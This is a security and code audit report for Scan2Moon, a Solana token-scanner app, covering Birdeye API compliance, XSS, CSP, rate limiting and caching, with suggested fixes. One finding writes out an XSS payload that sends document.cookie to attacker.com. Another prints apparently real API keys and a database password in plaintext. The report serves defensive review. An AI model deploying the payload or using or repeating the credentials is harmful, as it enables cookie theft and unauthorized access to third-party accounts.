# Scan2Moon — Full Production Audit Report (v2)
**Date:** April 22, 2026  
**Auditor:** Senior Full-Stack / Security / Birdeye Specialist (Deep Code Audit)  
**Codebase:** `scan2moon/` — Vanilla JS + Netlify Functions + Neon Postgres + Upstash Redis  
**Scope:** Birdeye Compliance · Security · Risk Scoring · Charts · P/L · Performance · Live-Readiness

---

## 1. Executive Summary

| Dimension | Status | Score |
|---|---|---|
| Birdeye API Compliance | 🟡 YELLOW — 1 critical violation | 85/100 |
| Security | 🔴 RED — 3 critical issues | 52/100 |
| Performance & Caching | 🟢 GREEN — excellent architecture | 88/100 |
| Risk Score Consistency | 🟡 YELLOW — bundle default drift | 78/100 |
| P/L & Portfolio Accuracy | 🟢 GREEN — honest and correct | 85/100 |
| Chart Quality | 🟢 GREEN — Birdeye OHLCV throughout | 87/100 |
| Code Quality | 🟡 YELLOW — minor issues | 80/100 |
| Competition Readiness | 🔴 RED — blocked by C1 and C2 | NOT READY |

**Overall Health: 🔴 RED — Do Not Go Live Yet**

The architecture is genuinely impressive. The caching layer (Redis → Neon → Birdeye), 429-retry logic, stale-fallback pattern, and per-endpoint rate limiting are all production-grade work. The Birdeye migration is ~95% complete and correct. However, six issues block launch: one Birdeye compliance violation that is a direct competition disqualifier, exposed production secrets requiring immediate key rotation, a serious XSS vector from unsanitized innerHTML with API-sourced data, a CSP misconfiguration that nullifies XSS protection, and two missing rate limiters on the highest-cost endpoints. Fix those six and the platform is competition-ready.

---

## 2. Critical Issues — Must Fix Before Live

---

### C1 🚨 COMPETITION DISQUALIFIER — Jupiter + CoinGecko SOL Price in `scanToken.js`

**File:** `netlify/functions/scanToken.js`, lines 58–85  
**Severity:** Competition Disqualifier / Birdeye Violation

Every call to `/scanToken` — the backbone of the entire scanner — fetches SOL price from Jupiter API first, then falls back to CoinGecko. This is a direct violation of the "ONLY Birdeye Data API for every single piece of data" rule.

```javascript
// CURRENT CODE — WRONG ❌
const [overviewRes, solPriceRes] = await Promise.all([
  birdeyeFetch(`https://public-api.birdeye.so/defi/token_overview?address=${enc}`, headers),
  fetch(`https://api.jup.ag/price/v2?ids=${SOL_MINT_SC}`, {   // ← NON-BIRDEYE
    signal: AbortSignal.timeout(5000),
  }),
]);

/* Fallback to CoinGecko if Jupiter failed */   // ← ALSO NON-BIRDEYE
if (!solPrice) {
  const cgRes = await fetch(
    "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd", ...
```

The `solPrice.js` function is Birdeye-only and already keeps a 10s Redis cache warm. `scanToken.js` must use Birdeye too.

**Fix — replace the Phase 1 SOL fetch block entirely:**

```javascript
// FIXED — Birdeye /defi/price for SOL + Redis stale fallback ✅
const SOL_MINT_SC = "So11111111111111111111111111111111111111112";

const [overviewRes, solPriceRes] = await Promise.all([
  birdeyeFetch(`https://public-api.birdeye.so/defi/token_overview?address=${enc}`, headers),
  birdeyeFetch(
    `https://public-api.birdeye.so/defi/price?address=${SOL_MINT_SC}&check_liquidity=10`,
    headers,
    1  // 1 retry max for SOL price
  ).catch(() => null),
]);

// overview error handling stays the same...

let solPrice = 0;
try {
  if (solPriceRes?.ok) {
    const j = await solPriceRes.json();
    solPrice = parseFloat(j?.data?.value ?? 0);
  }
} catch {}

// Stale Redis fallback — zero extra Birdeye CU most of the time
if (!solPrice) {
  try {
    const cached = await redisGet("sol_price_usd_v4"); // solPrice.js keeps this warm
    if (cached) solPrice = parseFloat(cached);
  } catch {}
}
if (!solPrice) solPrice = 150; // absolute last resort only

console.log("[scanToken] Birdeye OK — solPrice:", solPrice.toFixed(2));
```

Delete the CoinGecko fallback block (original lines 79–85) entirely.

---

### C2 🚨 EXPOSED PRODUCTION SECRETS — `.env` File on Disk

**File:** `.env` (workspace root)  
**Severity:** Critical Security — Rotate All Keys Immediately

The `.env` file contains every production secret in plaintext:

```
BIRDEYE_API_KEY=f748c7228ff34b268e85271f3626b45b
NEON_DATABASE_URL=postgresql://neondb_owner:npg_oeLuTGF09MRD@ep-holy-heart-...
HELIUS_KEY=b6baca26-222e-4c05-8e04-db0651690662
GEMINI_API_KEY=AQ.Ab8RN6JwCqe-...
GROQ_API_KEY=gsk_gWTlb3qW79w...
UPSTASH_REDIS_REST_TOKEN=gQAAAA...
```

`.gitignore` correctly excludes `.env` and the file was never committed to git history. However it is present on disk in the project folder. A single accidental `git add .` or push will expose all six keys permanently in git history — and this audit report itself now documents them.

**Three-step fix:**

Step 1: **Rotate all six keys right now.** Every key above is potentially compromised.

Step 2: **Set every value in Netlify Dashboard** → Site Settings → Environment Variables. Never in `.env`.

Step 3: **Delete the `.env` file:**
```bash
rm .env
# For local dev only, use: netlify env:pull .env.local
# and add .env.local to .gitignore
```

---

### C3 🚨 XSS — Unsanitized Token Metadata Injected into innerHTML

**Files:** `finalScore.js` (line 94), `script.js` (lines 127, 187, 191, 223), `scanSignals.js` (line 488)  
**Severity:** Critical — Remote Code Execution via Malicious Token Metadata

Token `name` and `symbol` from Birdeye API are inserted directly into `innerHTML` template literals without any HTML escaping. Anyone can deploy a token with a name like `<img src=x onerror="fetch('https://attacker.com/c='+document.cookie)">` and it will execute JavaScript in every user's browser the moment they scan that token.

Specifically vulnerable in `finalScore.js`:
```javascript
container.innerHTML = `
  <div class="token-name">${name}</div>       // ← name from Birdeye, NOT escaped
  <div class="token-symbol">${symbol}</div>   // ← same
  <div class="risk-badge-pro">${riskLevelText}</div>  // ← same
```

And in `script.js` line 191:
```javascript
<button onclick="navigator.clipboard.writeText('${mint}')...">
// mint is base58-validated, but nearby name/symbol are not
```

**Fix — add a shared escape utility and use it everywhere:**

Create `utils.js`:
```javascript
// utils.js (frontend)
export function esc(str) {
  return String(str ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
```

Apply in every innerHTML template:
```javascript
import { esc } from "./utils.js";

// finalScore.js
<div class="token-name">${esc(name)}</div>
<div class="token-symbol">${esc(symbol)}</div>
<div class="risk-badge-pro">${esc(riskLevelText)}</div>
<div class="explain-text">${esc(explanation)}</div>
```

Replace inline `onclick` in `script.js` with a data-attribute pattern:
```javascript
// BEFORE ❌
<button onclick="navigator.clipboard.writeText('${mint}')...">Copy</button>

// AFTER ✅
<button class="tl-copy-btn" data-mint="${esc(mint)}">Copy</button>
// Bind once: document.querySelectorAll('.tl-copy-btn').forEach(btn =>
//   btn.addEventListener('click', () =>
//     navigator.clipboard.writeText(btn.dataset.mint).then(...)));
```

---

### C4 🚨 CSP `unsafe-inline` Completely Nullifies XSS Protection

**File:** `netlify.toml`  
**Severity:** Critical Security

```toml
Content-Security-Policy = "default-src 'self'; script-src 'self' 'unsafe-inline' cdn.jsdelivr.net unpkg.com; ..."
```

`'unsafe-inline'` allows any inline `<script>` tag and every event handler attribute (`onclick=`, `onerror=`, etc.) to execute. This means the CSP header is present but provides literally zero XSS defense. Even after fixing C3, an injected `<img onerror=...>` payload executes freely.

Additional issue: `unpkg.com` in `connect-src` allows data exfiltration to arbitrary npm package endpoints.

**Fix:**
```toml
Content-Security-Policy = "default-src 'self'; script-src 'self' cdn.jsdelivr.net; connect-src 'self' *.upstash.io *.neon.tech; img-src 'self' data: https:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; frame-ancestors 'none';"
```

Removing `unsafe-inline` requires moving any remaining inline `<script>` blocks in HTML files to external `.js` files. This is a ~2–3 hour refactor but mandatory for real XSS protection.

---

### C5 🚨 No Rate Limiting on `/scanToken` and `/ohlcvData`

**Files:** `netlify/functions/scanToken.js`, `netlify/functions/ohlcvData.js`  
**Severity:** Critical — Quota Exhaustion / DoS

Both of the highest Birdeye compute-unit endpoints have NO per-IP rate limiting. Every other endpoint uses `isRateLimitedRedis`. A single IP looping `/scanToken` 100 times can exhaust your entire daily Birdeye quota in seconds, taking the whole platform offline.

**Fix — add to the top of both handlers (after OPTIONS check):**

```javascript
const { getDb, redisGet, redisSet, CORS, isRateLimitedRedis } = require("./db");

// In handler:
const ip = (event.headers["x-forwarded-for"] || "").split(",")[0].trim() || "unknown";
if (await isRateLimitedRedis(ip, 20, 10)) {   // 20 requests per 10 seconds
  return { statusCode: 429, headers: { ...CORS, "Retry-After": "10" },
           body: JSON.stringify({ error: "Too many requests" }) };
}
```

---

### C6 🚨 Missing Mint Address Validation in `scanToken.js` and `ohlcvData.js`

**Files:** `netlify/functions/scanToken.js`, `netlify/functions/ohlcvData.js`  
**Severity:** High — Invalid input reaches Birdeye API

`tokenSecurity.js`, `holderData.js`, `walletTokens.js` all correctly validate mint parameters against a base58 regex before use. `scanToken.js` and `ohlcvData.js` do not, allowing arbitrary strings to reach Birdeye and waste compute units.

**Fix — add at the top of both handlers, before any other logic:**

```javascript
const MINT_RE = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
const { mint } = event.queryStringParameters || {};
if (!mint || !MINT_RE.test(mint)) {
  return { statusCode: 400, headers: CORS,
           body: JSON.stringify({ error: "Invalid mint address" }) };
}
```

---

## 3. Major Issues

---

### M1 — `bundle.js` Uses Helius RPC for All Bundle Detection (Non-Birdeye)

**File:** `netlify/functions/bundle.js`, line 38

The bundle attack detector — contributing 8% of the risk score — uses `mainnet.helius-rpc.com` for `getSignaturesForAddress`, transaction parsing, and common-funder checks. Birdeye does not expose raw on-chain transaction data. This is not fully avoidable today.

**Action:** In competition submission materials, explicitly document that bundle detection requires Solana RPC data that Birdeye does not yet provide. Frame as a gap you identified — request Birdeye add a bundle-detection or early-buyer endpoint. If judges are strict: display a badge noting "Bundle analysis: Powered by Solana RPC (Birdeye does not yet expose raw tx data)."

---

### M2 — Debug Logging Left in Production (`ohlcvData.js`)

**File:** `netlify/functions/ohlcvData.js`, inside `fetchBirdeye()`

```javascript
// Log first item to detect field names (remove after confirmed)
console.log("[Birdeye OHLCV] sample item keys:", Object.keys(items[0]));
console.log("[Birdeye OHLCV] sample item:", JSON.stringify(items[0]));
```

These log full Birdeye API responses to Netlify's function logs on every OHLCV cache miss — leaking raw pricing data, volume, and response structure. Delete both lines.

---

### M3 — Double Birdeye Call per Mint in `batchTokenData.js` (Wastes 50% of CU)

**File:** `netlify/functions/batchTokenData.js`

For each of up to 25 mints, the function makes two parallel Birdeye calls:
```javascript
const [priceRes, overviewRes] = await Promise.all([
  fetch(`/defi/price?address=...`),          // ← REDUNDANT — overview has price
  fetch(`/defi/token_overview?address=...`),
]);
```

`/defi/token_overview` already returns `data.price`. The separate `/defi/price` call doubles compute-unit consumption on every portfolio scan with zero data benefit.

**Fix:** Remove `priceRes` entirely. Use `Number(ov.price ?? 0)` from the overview response.

---

### M4 — Risk Score Inconsistency: Stale Bundle Score on Watchlist

**Files:** `finalScore.js`, `watchlist.js`

When a token is saved to watchlist before bundle analysis completes (or if bundle fails), the default `bundleScore: 75` is persisted in localStorage. On subsequent watchlist live-refreshes, `computeRiskScore(pair, top10Pct, 75)` uses this stale neutral value. A genuinely dangerous bundled token may display as safer on the watchlist than in the full scanner.

**Fix:** Store `bundleScoreUpdatedAt` alongside `bundleScore`. On live-refresh, if stored score is 75 (default) or is older than 30 minutes, re-run bundle detection before displaying the score.

---

### M5 — In-Process Rate Limiter in `sentinel.js` (Not Stateful Across Lambda Instances)

**File:** `netlify/functions/sentinel.js`

Uses in-process `rateMap` which resets on every cold start and is not shared across concurrent Lambda instances. Under load, the 5-req/minute limit is trivially bypassed by hitting concurrent instances.

**Fix:** Replace with `isRateLimitedRedis(ip, 5, 60)` from `db.js`.

---

### M6 — `priceChange6hPercent` Field Does Not Exist in Birdeye

**File:** `netlify/functions/batchTokenData.js`

```javascript
priceChange6h: ov.priceChange6hPercent ?? null,    // ← field does not exist in Birdeye
```

Birdeye has no 6h price change. `scanToken.js` correctly documents this and uses `priceChange8hPercent` as the closest substitute. `batchTokenData.js` will always return `null` for `priceChange6h`, creating data inconsistency between portfolio and scanner views.

**Fix:** Align with the scanner's approach:
```javascript
priceChange6h: ov.priceChange8hPercent ?? ov.priceChange4hPercent ?? null,
```

---

### M7 — DDL Statement in Hot Request Path (`scanToken.js`)

**File:** `netlify/functions/scanToken.js`

```javascript
if (!_schemaReady) {
  await sql`ALTER TABLE token_cache ADD COLUMN IF NOT EXISTS pair_created_at BIGINT`;
  _schemaReady = true;
}
```

`_schemaReady` is process-local, resetting on every cold start and every concurrent Lambda instance. On a busy day this `ALTER TABLE` runs dozens of times, adding ~200ms to first-scan latency and generating Neon DDL lock contention.

**Fix:** Run this once in `initDb.js` as a deployment migration. Remove from `scanToken.js` entirely.

---

### M8 — Hardcoded SOL Fallback Price of $150

**Files:** `netlify/functions/solPrice.js`, `netlify/functions/simulator.js`

```javascript
const FALLBACK_SOL_PRICE = 150;  // solPrice.js
return 150;                       // simulator.js
```

SOL's current price differs substantially from $150. Users hitting this fallback during a Birdeye outage see wildly incorrect P/L and simulator balances. Replace with a dynamic last-known value stored in Neon when Birdeye last responded successfully.

---

### M9 — `newPairs.js` Uses In-Process Rate Limiter

**File:** `netlify/functions/newPairs.js`

```javascript
if (isRateLimited(ip, 15, 10000))   // ← in-process, not stateful
```

Replace with `isRateLimitedRedis` for consistent enforcement across Lambda instances.

---

## 4. Minor Issues / Polish

**m1:** `rpc.js` (frontend) still in codebase — proxies through `/.netlify/functions/helius`. Verify no active imports remain, then delete both `rpc.js` and the `helius.js` function if unused by any live frontend code.

**m2:** `netlify/functions/ohlcvData.js.orig` backup file is deployed as a Netlify function. Delete it: `rm netlify/functions/ohlcvData.js.orig`

**m3:** JS/CSS `Cache-Control: max-age=300` is too short without content-hash filenames. Add a deploy-time version query string (e.g. `?v=20260422`) to asset URLs and increase to `max-age=604800`.

**m4:** No `Retry-After` header on 429 responses anywhere. Add `"Retry-After": "10"` to all rate-limit responses so frontends back off correctly.

**m5:** Portfolio P/L disclaimer exists in comments but not in the rendered UI. Show visibly: *"Shows 24h price impact on current holdings — not actual P&L since purchase."*

**m6:** `sentinel.js` uses Groq/Llama AI for analysis. The data input is 100% Birdeye-sourced, which is fine. Document clearly in competition materials: "AI analysis powered by Groq; all underlying market data is from Birdeye."

**m7:** Watchlist stored in `localStorage` only — clears with browser data, no cross-device sync. Acceptable for now; plan Neon-based server storage before the API-rental phase.

**m8:** `test-birdeye.js` test file in project root should be removed before competition submission.

---

## 5. Positive Findings

**Architecture — genuinely excellent:**
- Redis (L1) → Neon (L2) → Birdeye (L3) caching is production-grade. Sub-millisecond cache hits protect Birdeye quota and give users instant data on warm cache.
- `warmCache.js` scheduled every 2 minutes keeps hot tokens fresh with zero user-facing latency.
- `staleResponseFromNeon()` in `scanToken.js` gracefully serves stale data during Birdeye downtime — the UI never shows a blank error.
- QUOTA_EXCEEDED handling that differentiates 400 compute-units errors from 429 rate-limit errors and serves stale Neon data is exceptional engineering.

**Birdeye Integration — comprehensive:**
- 10 unique Birdeye endpoints used: `/defi/price`, `/defi/token_overview`, `/defi/ohlcv`, `/defi/tokenlist`, `/defi/multi_price`, `/defi/token_creation_info`, `/defi/v2/markets`, `/defi/token_security`, `/defi/v3/token/holder`, `/v1/wallet/token_list`.
- `priceOnly.js` with 5s TTL is a smart lightweight ticker that minimizes compute-unit cost for live chart updates while keeping prices current.
- Multi-timeframe OHLCV (1m/5m/15m/1h/4h/1d) all from Birdeye — full chart suite.
- Pump.fun graduation detection via `/defi/v2/markets` is a legitimate Birdeye-only feature, great for competition showcase.

**Security (non-XSS) — solid:**
- HSTS with `max-age=63072000; includeSubDomains; preload` — correctly configured.
- `X-Frame-Options: DENY` and `X-Content-Type-Options: nosniff` — present.
- CORS locked to production domain `https://scan2moon.com`.
- Redis-backed stateful rate limiting on most endpoints.
- Base58 mint address validation on most endpoints.
- Server-side price validation in simulator.js — prevents submitted price manipulation.
- 429 retry with exponential backoff in `birdeyeFetch()`.

**Risk Engine — well-designed:**
- 12-signal weighted scoring with hard overrides correctly penalises the most dangerous patterns.
- Pump.fun bonding curve vs. graduated DEX distinction is correctly implemented and competition-showcaseable.
- Bot noise detection via average transaction size is a smart, original heuristic.
- Neutral default (35/45/75) for missing data is conservative and honest.

---

## 6. Birdeye Compliance Confirmation

### ✅ Compliant Endpoints

| Endpoint | Files | Notes |
|---|---|---|
| `/defi/price` | `solPrice.js`, `priceOnly.js`, `simulator.js`, `batchTokenData.js` | SOL price + live tickers |
| `/defi/token_overview` | `scanToken.js`, `batchTokenData.js`, `holderData.js`, `tokenSecurity.js` | Core scanner data |
| `/defi/ohlcv` | `ohlcvData.js`, `geckoProxy.js` | All chart timeframes |
| `/defi/tokenlist` | `topGainers.js`, `entryRadar.js` | Top Gainers + Entry Radar |
| `/defi/multi_price` | `topGainers.js` | Batch price enrichment |
| `/defi/token_creation_info` | `scanToken.js` | Token age scoring |
| `/defi/v2/markets` | `scanToken.js` | Pool creation date, pump.fun graduation |
| `/defi/token_security` | `tokenSecurity.js` | Mint/freeze authority |
| `/defi/v3/token/holder` | `holderData.js` | Top 20 holder list |
| `/v1/wallet/token_list` | `walletTokens.js` | Portfolio wallet scan |

**Total unique Birdeye endpoints: 10**  
**Estimated daily API calls at moderate traffic: 1,000–5,000+ (far above 50 minimum)**

### ❌ Non-Compliant Sources

| Source | File | Status |
|---|---|---|
| Jupiter API (SOL price primary) | `scanToken.js` | **MUST FIX — C1** |
| CoinGecko (SOL price fallback) | `scanToken.js` | **MUST FIX — C1** |
| Helius RPC (bundle detection) | `bundle.js` | Document as exception |
| Groq / Llama (AI analysis) | `sentinel.js` | Acceptable — AI inference, data is Birdeye |

---

## 7. Performance & Security Score

| Category | Current | After Fixes | Notes |
|---|---|---|---|
| **Security** | **52/100** | **88/100** | C2 + C3 + C4 are the blockers |
| **Birdeye Compliance** | **85/100** | **96/100** | C1 fix gets this to near-perfect |
| **Performance / Caching** | **88/100** | **92/100** | M3 fix saves ~50% CU on portfolio |
| **Rate Limiting** | **70/100** | **92/100** | C5 closes the two biggest gaps |
| **Code Quality** | **80/100** | **88/100** | Debug logs, dead code, validation |
| **Error Handling** | **91/100** | **93/100** | Already excellent |

---

## 8. Final GO-LIVE Checklist

### 🔴 Blockers — Complete Before Any Public Launch

- [ ] **C1**: Remove Jupiter + CoinGecko from `scanToken.js`. Replace with Birdeye `/defi/price` + Redis stale fallback.
- [ ] **C2**: Rotate ALL six secrets (Birdeye, Neon, Helius, Gemini, Groq, Upstash). Set in Netlify Dashboard. Delete `.env` from project folder.
- [ ] **C3**: Add `esc()` HTML sanitizer in `utils.js`. Apply to every API-sourced string in every `innerHTML` template across all JS files.
- [ ] **C4**: Remove `'unsafe-inline'` and `unpkg.com` from CSP. Move remaining inline scripts to external `.js` files.
- [ ] **C5**: Add `isRateLimitedRedis` to `scanToken.js` and `ohlcvData.js`.
- [ ] **C6**: Add base58 `MINT_RE` validation to `scanToken.js` and `ohlcvData.js`.

### 🟡 Strong Recommendations (Pre-Launch)

- [ ] **M2**: Delete two debug `console.log` lines from `ohlcvData.js`.
- [ ] **M3**: Remove redundant `/defi/price` call from `batchTokenData.js` — halves portfolio CU usage.
- [ ] **M5**: Replace in-process `isRateLimited` in `sentinel.js` with `isRateLimitedRedis`.
- [ ] **M6**: Fix `priceChange6hPercent` → use `priceChange8hPercent` in `batchTokenData.js`.
- [ ] **M7**: Move `ALTER TABLE` DDL from `scanToken.js` hot path to `initDb.js` migration.
- [ ] **M9**: Replace in-process rate limiter in `newPairs.js` with `isRateLimitedRedis`.
- [ ] **m2**: Delete `netlify/functions/ohlcvData.js.orig`.
- [ ] **m4**: Add `"Retry-After": "10"` header to all 429 responses.
- [ ] Show portfolio P/L disclaimer in the rendered UI.
- [ ] Confirm `rpc.js` is unused and delete it (+ `helius.js` if no longer needed).
- [ ] Delete `test-birdeye.js` from project root.

### 🟢 Post-Launch (Next Sprint)

- [ ] Move watchlist to Neon for cross-device sync and future API-rental dashboard.
- [ ] Update hardcoded `FALLBACK_SOL_PRICE = 150` to pull last-known price from Neon `kv_store`.
- [ ] Add content-hash versioning to JS/CSS asset URLs; set `max-age=604800`.
- [ ] Build multi-tenant API key management layer for API rental feature.
- [ ] Add audit/billing logging (caller IP, endpoint, CU cost) in preparation for metered billing.
- [ ] Document Helius bundle dependency in `BIRDEYE_COMPETITION.md`.

### Competition Submission Checklist

- [ ] C1 fix in place — zero non-Birdeye data sources in the scanner path
- [ ] `BIRDEYE_COMPETITION.md` updated: list all 10 Birdeye endpoints, estimated daily API call volume, unique features enabled by Birdeye
- [ ] README updated with live demo link, architecture overview, and feature list
- [ ] Video demo or GIF of the scanner in action (scan a live token, show risk breakdown)
- [ ] GitHub repo is public; commit history tells a clean story (squash fix commits)
- [ ] Remove `.orig` files, `test-birdeye.js`, and old audit docs before submission

---

## 9. Competition Score Maximization — Bonus Recommendations

**Community Support:**
- Pin a tweet thread showing the full scanner on a live token with the Birdeye-powered risk breakdown screenshot
- Post weekly "Scan before you ape" alpha call validation in Birdeye Discord, tagging @birdeye_so
- Add a live "total scans performed" counter to the homepage (store in Neon, cheap counter endpoint)

**Product Utility:**
- The Top Gainers page with real-time Birdeye data is your headline feature for judges who open the site — make it visually dominant on the homepage
- Highlight the pump.fun graduation detection as a "only possible with Birdeye `/defi/v2/markets`" use case in your submission — this is genuinely unique
- Add Birdeye `/defi/trades` to show a recent trades table on the token page — demonstrates another endpoint and adds real-time energy

**Technical Depth:**
- Write up the 3-layer caching architecture (Redis → Neon → Birdeye) in the README with a diagram — production-grade engineering judges will notice
- The QUOTA_EXCEEDED → stale Neon fallback pattern is genuinely sophisticated; call it out explicitly
- The server-side price validation in the simulator (prevents submitted price manipulation) is a great security story

**Presentation:**
- Clean GitHub commit history before submission — squash the fix/fix/fix commits so the log reads as a product story
- Add a `CHANGELOG.md` showing the Birdeye migration journey
- Remove all `.orig` files, backup files, and old audit docs before making the repo public

---

*End of Audit Report — Scan2Moon Platform, April 22, 2026*
